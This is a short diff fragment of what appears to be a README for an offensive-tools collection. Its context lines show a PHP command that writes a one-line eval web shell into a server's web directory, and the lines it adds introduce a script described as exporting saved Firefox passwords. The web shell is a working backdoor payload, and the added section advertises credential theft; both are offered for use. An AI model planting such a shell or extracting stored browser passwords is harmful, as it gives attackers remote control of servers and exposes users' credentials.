@@ -80,5 +80,6 @@ Eg.
 system('cmd /c "echo ^<?php @eval(^$_POST[pwd]);?^> >D:\phpstudy\WWW\test.php"');
 ```
 
+### ExportFirefoxPassword.py
 
-
+Use to export the password of the Firefox
